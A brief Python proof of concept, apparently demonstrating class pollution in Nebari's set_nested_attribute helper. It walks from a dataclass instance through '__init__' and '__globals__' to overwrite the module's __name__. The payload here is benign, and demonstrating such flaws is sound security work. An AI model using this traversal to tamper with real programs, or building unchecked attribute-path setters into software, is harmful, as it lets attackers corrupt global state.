from _nebari.config import set_nested_attribute
from dataclasses import dataclass

@dataclass
class State:
  input: str
  output: str
  textarea_key: int

obj = State('HELLO', 'WORLD', 0)

set_nested_attribute(obj, ['__init__', '__globals__', '__name__'], 'polluted')
print(__name__) # polluted